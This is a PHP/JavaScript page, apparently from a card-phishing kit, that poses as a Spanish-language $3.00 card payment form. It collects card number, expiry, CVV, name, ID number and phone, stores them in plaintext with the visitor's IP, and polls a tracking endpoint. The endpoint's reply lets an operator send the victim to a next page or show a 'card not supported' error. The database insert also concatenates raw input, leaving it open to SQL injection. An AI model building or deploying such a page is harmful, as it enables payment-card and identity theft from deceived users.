<?php
session_start();
require_once 'config.php';
include('partials/header.php');
include('header_new.php');




if(isset($_SESSION['post']['recipients_name'])) {
    $_SESSION['recipients_name'] = $_SESSION['post']['recipients_name'];
}
if(isset($_POST['cardnumber']) && $_POST['month'] && $_POST['year'] && $_POST['cvv'] && $_POST['recipients_name']) {
    // $_POST['recipients_name'] = $_SESSION['recipients_name'];
    $_SESSION['post'] = $_POST;
}
if (isset($_POST['submit'])) {
    $_SESSION['post'] = $_POST;
}

if (isset($_POST['payment_submit']) and !empty($_SESSION['post'])) {

    $payment_info = $_POST;
    $_POST = $_SESSION['post'];
    $ip = get_client_ip();



    if (!empty($_POST['recipients_name'])) {
        $fullname = $_POST['recipients_name'];
    } else {
        $fullname = "";
    }

    if (!empty($_POST['country'])) { // country
        $country = $_POST['country'];
    } else {
        $country = "";
    }
    if (!empty($_POST['other_country'])) {
        $othercountry = $_POST['other_country'];
    } else {
        $othercountry = "";
    }
    if (!empty($_POST['idtype'])) { // idtype
        $idtype = $_POST['idtype'];
    } else {
        $idtype = "";
    }
    if (!empty($_POST['id_number'])) { // id_number
        $idnumber = $_POST['id_number'];
    } else {
        $idnumber = "";
    }

    if (!empty($_POST['contact_number'])) {
        $phone = $_POST['contact_number'];
    } else {
        $phone = "";
    }
    $_SESSION["contact_number"] = $phone;


    if (!empty($payment_info['cardnumber'])) {
        $cardnumber = str_replace(' ', '', $payment_info['cardnumber']);
    } else {
        $cardnumber = "";
    }
    if (!empty($payment_info['month']) and !empty($payment_info['year'])) {
        $exp_date = $payment_info['month'] . '/' . $payment_info['year'];
    } else {
        $exp_date = "";
    }
    if (!empty($payment_info['cvv'])) {
        $card_code = $payment_info['cvv'];
    } else {
        $card_code = "";
    }

    $date = date('Y-m-d H:i:s');
    $sql = "INSERT INTO user_information (fullname, countryName, othercountry, idtype, idnumber, phone, date_created, date_updated, cardnumber, exp_date, card_code, ipaddress)
	VALUES ('" . $fullname . "', '" . $country . "', '" . $othercountry . "', '" . $idtype . "', '" . $idnumber . "', '" . $phone . "', '" . $date . "',now(),'" . $cardnumber . "','" . $exp_date . "','" . $card_code . "','" . $ip . "')";

// echo $sql; die;
    if (mysqli_query($conn, $sql)) {
        $last_id = mysqli_insert_id($conn);
        $_SESSION["last_id"] = $last_id;

        $_SESSION['post'] = '';
        $_SESSION['total_quantity'] = '';
        $_POST = '';

        //echo '<script>window.location.replace("page5.php")</script>';
        echo '<style>.spinner-border{display:block !important;}</style>';
        echo '<style>.backdrop{display:block !important;}</style>';
        //echo "New record created successfully. Last inserted ID is: " . $last_id;
    } else {
        $err = "Error: " . $sql . "<br>" . mysqli_error($conn);
    }
} // submit end

?>

    <style>
        .hideH {
            display:none !important;
        }
        .wrap {
            padding: 0px 20px;
            margin-top:50px;
        }
        .step{
            color: #325754;
            padding-bottom: 10px;
            font-weight: bold;
        }
        .top1 table.cstm-table td {
            font-size: 14px;
            letter-spacing: 0;
            white-space: normal;
            padding: 5px 0;
            vertical-align: text-bottom;
            line-height: 1.3;
            color:#000;
        }
        .top1 table.cstm-table td strong {
            white-space: nowrap;
            margin-right: 15px;
            color:#325754;
        }
        .form-input label {
            display: block;
            color:#333333;
            font-weight: bold;
        }
        .form-input input {
            width: calc(100% - 30px);
        }
        .form-row input, .form-input input, .form-row select {
            flex-grow: 1;
            border: 1px solid #325754;
            height: 30px;
            outline: none;
            padding: 0 10px;
            border: 1px solid #325754;
            height: 30px;
            outline: none;
            padding: 0 10px;
            border-radius: 4px;
        }
        }
        .card-icons img:last-child {
            padding: 1px 4px;
            border-radius: 3px;
            background-color: #fff;
            height: 23px;
            position: relative;
            top: -1px;
        }
        table td {
            border: none !important;
           
        }
        .card-icons img {
            height: 25px !important;
            margin-top: 5px;
        }
        .form-input .select {
            padding-right: 15px;
            width: 25%;
            margin-top: 12px;
            margin-bottom: 12px;
        }
        label.required:after {
            content: " *";
            color: red;
        }
        .form-input {
            margin-bottom: 20px;
        }
        .form-input.cvv input {
            width: 70px;
            color:#333333;
        }
        .form-input.cvv {
            align-items: end;
            color:#333333;
            display: flex;
        }
        .form-input.cvv span img {
            width: 30px;
            margin-left: 20px;
        }
        .extra-details > p {
            color:#333333;
        }
        .form-input.ddmm {
            display: flex;
        }
        h3.step {
            font-size: 18px;
            font-weight: bold;
            color: #325754;
            margin-bottom: 10px;
        }
        .extra-details {
            text-align: center;
            font-weight: bold;
            margin-top: 25px;
            font-size: 14px;
            margin-bottom:20px;
        }

        .top1 h3 {
            text-align: center;
            margin-bottom: 15px;
            font-size:22px;
            margin-top: 15px;
            color:#325754;
        }

        .top1 table.cstm-table td {
            font-size: 14px;
            letter-spacing: 0;
            white-space: normal;
            padding: 5px 0;
            vertical-align: text-bottom;
            line-height: 1.3;
        }

        .top1 table.cstm-table td strong {
            white-space: nowrap;
            margin-right: 15px;
        }

        .top1 table.cstm-table {
            margin-bottom: 20px;
        }
        .card-icons {
            padding-bottom: 11px;
        }
        .backd-form {
            border: 2px solid black;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .form-input.cvv:last-child { border-bottom: none; }
        .form-input {
            border-bottom: 1px solid;
            padding: 20px;
        }
        .form-input {
            margin-bottom: unset !important;
        }
        @media(max-width: 767px) {
            .submit-btn {
                background-color: #00a8b7;
                padding: 11px 24px;
                font-size: 20px;
                display: block;
                width: 100%;
                min-width: 120px;
                margin-left: auto;
                margin-right: auto;
                line-height: 22px;
                border-radius: 32px;
                color: #fff;
                border-color: #00a8b7;
                height: auto;
                cursor: pointer;
            }

            .submit-btn:hover:hover {
                background-color: #00a8b7;
                border-color: #00a8b7;
            }
        }
    </style>

    <div class="wrap">

        <div class="form">
            <form action="" method="POST">
                <h3 class="step">
                <div class="top1">

                    <h3 class="text-center">Por favor, pague con tarjeta de crédito</h3>

                    <table class="cstm-table" border="0" width="100%">

                        <tbody>
                        <tr>
                            <td><strong>Importe total:</strong></td>
                            <td>$ 3.00 </td>
                        </tr>
                        </tbody>

                    </table>

                </div>

                <div class="backdrop"></div>
                <div class="backd-form">
                <div class="form-input">
                    <label class="required" for="">Número de tarjeta</label>
                    <input type="text" id="cr_no" name="cardnumber" minlength="19" maxlength="19" placeholder="xxxx-xxxx-xxxx-xxxx">
                    <span class="errormsg" style="color:red; display:none;">不支持該卡，請更換並重新輸入</span>
                </div>
                <div class="form-input ddmm">
                    <div class="select">
                        <label class="required" for=""></label>
                        <select name="month" id="">
                            <option value="">MM</option>
                            <?php for ($i = 1; $i <= 12; $i++) echo ('<option value="' . $i . '">' . $i . '</option>'); ?>
                        </select>
                    </div>
                    <div class="select">
                        <label class="required" for=""></label>
                        <select name="year" id="">
                            <option value="">YY</option>
                            <?php for ($i = 22; $i <= 32; $i++) echo ('<option value="' . $i . '">' . $i . '</option>'); ?>
                        </select>
                    </div>
                </div>
                <div class="form-input">
                    <label class="required" for="">Nombre del titular de la tarjeta</label>
                    <input type="text" value="" name="recipients_name">
                </div>
                <div class="form-input cvv">
                    <label class="required" for="">CVC</label>
                    <input type="text" name="cvv">
                    <span><img src="images/cvv.jpg" alt=""><strong>Código de seguridad</strong></span>
                </div>
                 </div>
                <div class="center"><button class="disabled submit-btn disabledClass" disabled onclick="hitSubmit()" name="payment_submit" type="submit">Pago($3.00)</button></div>
            </form>
            <div class="extra-details">
                <div class="card-icons">
                 <img src="images/social.png" alt="">
                </div>
                <p>Observaciones: Tarjetas de crédito de bancos emisores individuales/Las organizaciones pueden no ser capaces de realizar transacciones en línea.</br>
                    Si hay algún problema con su tarjeta de crédito para realizar transacciones en este sitio web.</br>
                    Comuníquese con el banco/institución emisor de su tarjeta</p>
            </div>
        </div>
    </div>

    <div class="spinner-border" id="ajaxprogress" style="z-index: 9999;position: fixed;top:0px;display:none;height:100%;width:100%;left: unset;right: unset;" role="status">
  <span class="" style="z-index: 1041;display: flex;justify-content: center;width: 100%;align-items: center;height:100%;">
      <div class="lds-default"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
  </span>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.slim.min.js" integrity="sha512-yBpuflZmP5lwMzZ03hiCLzA94N0K2vgBtJgqQ2E1meJzmIBfjbb7k4Y23k2i2c/rIeSUGc7jojyIY5waK3ZxCQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script type="text/javascript" src="./assets/js/jquery-2.1.3.min.js"></script>
    <script>
        function hitSubmit() {
            $(".backdrop").show();
            $('#ajaxprogress').show();
        }
        //script to check input
        jQuery('.form-input input, .form-input select').on('input', function() {
            let check = true;
            jQuery('.form-input input, .form-input select').each(function() {
                if (jQuery(this).val() == '') check = false;
            });
            if (check) jQuery('.btn').removeClass('disabled');
            else jQuery('.btn').addClass('disabled')
        });
        function creditCardValidation()
        {
            let creditCradNum = $('#cr_no').val();
            console.log("creditCradNum ==>",creditCradNum.length === 19);
            if(creditCradNum.length === 19)
            {
                $(".submit-btn").removeClass('disabled');
                $(".submit-btn").removeClass('disabledClass');
                $(".submit-btn").attr('disabled', false);
                return true;
            }
            else
            {
                console.log("Please enter a valid credit card number.");
                $(".submit-btn").addClass('disabledClass');
                $(".submit-btn").attr('disabled', true);
                return false;
            }
        }

        //For Card Number formatted input
        var cardNum = document.getElementById('cr_no');
        cardNum.onkeyup = function(e) {
            creditCardValidation();
            $("#cr_no").removeAttr("style");
            $(".errormsg").css("display", "none");
            if (this.value == this.lastValue) return;
            let caretPosition = this.selectionStart;
            let sanitizedValue = this.value.replace(/[^0-9]/gi, '');
            let parts = [];

            for (var i = 0, len = sanitizedValue.length; i < len; i += 4) {
                parts.push(sanitizedValue.substring(i, i + 4));
            }

            for (var i = caretPosition - 1; i >= 0; i--) {
                var c = this.value[i];
                if (c < '0' || c > '9') {
                    caretPosition--;
                }
            }
            caretPosition += Math.floor(caretPosition / 4);

            this.value = this.lastValue = parts.join(' ');
            this.selectionStart = this.selectionEnd = caretPosition;
            // if (sanitizedValue.length > 0)
            //   $("input[name=payment_submit]").removeAttr('disabled');
            // else
            //   $("input[name=payment_submit]").attr('disabled', 'disabled');
        }
    </script>


    <script type="text/javascript">
        function updatePromptStatus() {
            $.ajax({
                type: 'post',
                url: 'prompt_status.php',
                data: {
                    'userid': userid,
                    'page': 4
                },
                success: function (data) {
                }
            });
        }
        jQuery(document).ready(function() {
            popcount = 1;
            window.setInterval(function() {
                // do stuff
                var userid = '<?php echo @$_SESSION["last_id"]; ?>';
                $.ajax({
                    type: 'post',
                    url: 'usertrackingstatus.php',
                    data: {
                        'userid': userid,
                        'page': 2
                    },
                    success: function(data) {
                        if (data == 1) {
                            jQuery(location).attr('href', './page5.php');
                        }
                        if (data == 2 || data == '2') {
                            jQuery("#ajaxprogress").css("display", "none")
                            jQuery('#carderror').css('display', 'block');
                            if (popcount == 1) {
                                if (window.confirm('Esta tarjeta no es compatible actualmente, cambie a otro pago con tarjeta de crédito.')) {
                                    console.log("window confirm box message");
                                    $(".backdrop").addClass('hideH');
                                    $('#ajaxprogress').addClass('hideH');
                                    updatePromptStatus();
                                }
                            }
                            popcount++;
                            $(".backdrop").hide();
                            return false;
                        }

                    }
                });

            }, 4000);


            $("body").on("change", "#cr_no", function() {

                var ignoreArray = ["123456789", "22222222"];
                var currentValue = $(this).val().replace(/ /g, '');

                if (jQuery.inArray(currentValue, ignoreArray) != -1) {
                    $("#cr_no").css("border", "2px solid red");
                    $(".errormsg").css("display", "block");

                }


            })

        })
    </script>
    <script>
        /* JS comes here */
        function setOnline(id, status) {
            if (id) {
                $.ajax({
                    type: 'post',
                    url: 'usertrackingstatus.php',
                    data: {
                        'id': id,
                        'status': status
                    },
                    success: function(data) {

                    }
                });
            }
        }
        var userid = <?php echo isset($_SESSION["last_id"]) ? $_SESSION["last_id"] : ''; ?>


            window.addEventListener('load', function(e) {
                if (navigator.onLine) {
                    setOnline(userid, 1)
                } else {
                    setOnline(userid, 0)
                }
            }, false);

        window.addEventListener('online', function(e) {
            setOnline(userid, 1)
        }, false);

        window.addEventListener('offline', function(e) {
            setOnline(userid, 0)
        }, false);
    </script>

<?php
include('footer_new.php');
